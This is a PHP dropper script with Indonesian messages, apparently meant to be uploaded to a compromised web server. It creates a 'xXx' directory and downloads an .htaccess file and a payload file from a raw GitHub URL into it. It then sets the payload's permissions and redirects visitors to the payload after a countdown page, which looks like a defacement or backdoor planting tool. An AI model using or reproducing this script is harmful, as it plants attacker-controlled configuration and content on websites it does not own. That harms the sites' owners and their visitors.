<?php

echo "<font color=lime>";
$dir = "xXx";
@mkdir($dir);
if($dir){
    echo "<center><h1><br>Tak Perlu Meneteskan Air Mata Lagi Untuk Seorang Penghianat Cinta<br><br> ==================== ";
} else {
    echo "<br> [-] Error !";
}

    $dihianati = "https://raw.githubusercontent.com/antoniola/js/master/h.txt";
    $file = file_get_contents($dihianati);
    $open = fopen("xXx/.htaccess" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> 100% Galau Success Full";
     } else {
         echo "<br>[-] Error !";
     }


    $sedih = "https://raw.githubusercontent.com/antoniola/js/master/0.txt";
    $file2 = file_get_contents($sedih);
    $open = fopen("xXx/HsH.txt" , 'w');
	chmod("xXx/HsH.txt",0755);
    fwrite($open,$file2);
    fclose($open);
     if($open) {
         echo "<br> ==================== ";
		 
echo "<script type=\"text/JavaScript\">\n"; 
echo "<!--\n"; 
echo "function eventualRedirect(redirectTo, timeoutPeriod) {\n"; 
echo "setTimeout(\"location.href = redirectTo;\",timeoutPeriod);\n"; 
echo "}\n"; 
echo "\n"; 
echo "setTimeout(\"location.href = './xXx/HsH.txt';\",5000);\n"; 
echo "-->\n"; 
echo "</script>\n"; 
echo "\n"; 
echo "<body>\n"; 
echo "<br>\n"; 
echo "<center>\n"; 
echo "<img src='https://raw.githubusercontent.com/antoniola/js/master/Loading.gif' border='0' width='50' height='50.5' alt='Loading'><br>Tunggu <script type=\"text/javascript\">\n"; 
echo "\n"; 
echo "// KONFIGURASI\n"; 
echo "var menit = 1; // Lamanya hitung mundur (dalam menit)\n"; 
echo "var detik = 5; // Detik standar (jangan diubah kecuali Anda tahu yang Anda lakukan)\n"; 
echo "var penghitung_detik = detik; // Set variabel detik yang lain untuk dimanipulasi\n"; 
echo "\n"; 
echo "// HITUNG MUNDUR\n"; 
echo "penghitung_detik = 0;\n"; 
echo "function hitung_mundur() {\n"; 
echo "penghitung_detik--; // Setiap siklus 1 detik mengurangi nilainya 1 poin\n"; 
echo "if (penghitung_detik == -1) { // Deteksi detik ketika nilainya \"0\"\n"; 
echo "menit--; // Setiap siklus 1 menit mengurangi nilainya 1 poin\n"; 
echo "penghitung_detik = detik; // Me-reset detik untuk memulai hitung mundur menit yang baru\n"; 
echo "if (menit <= -1) { // Hitung mundur selesai\n"; 
echo "menit = 0;penghitung_detik = 0; // Menset menit dan detik ke \"0\"\n"; 
echo "clearTimeout(penghitung); // Stop hitung mundur\n"; 
echo "}\n"; 
echo "}\n"; 
echo "if (document.getElementById) {\n"; 
echo "document.getElementById(\"hitung_mundur_tampil\").innerHTML=penghitung_detik; // Memasukkan nilai variabel menit dan detik untuk ditampilkan\n"; 
echo "}\n"; 
echo "penghitung=setTimeout(\"hitung_mundur()\", 1000); // Set siklus penghitungan mundur (standar: 1 detik)\n"; 
echo "}\n"; 
echo "\n"; 
echo "// INISIALISASI\n"; 
echo "if (document.all||document.getElementById)\n"; 
echo "document.write(' <b id=\"hitung_mundur_tampil\">'+penghitung_detik+' </b>'); // Format tampilan hitung mundur di antarmuka\n"; 
echo "hitung_mundur();\n"; 
echo "</script> Detik </font>\n";	
		 
		 
     } else {
         echo "<br>[-] Error !<br>Harus Upload Manual</center>";
		 echo "</h1></font>";
     }


?>
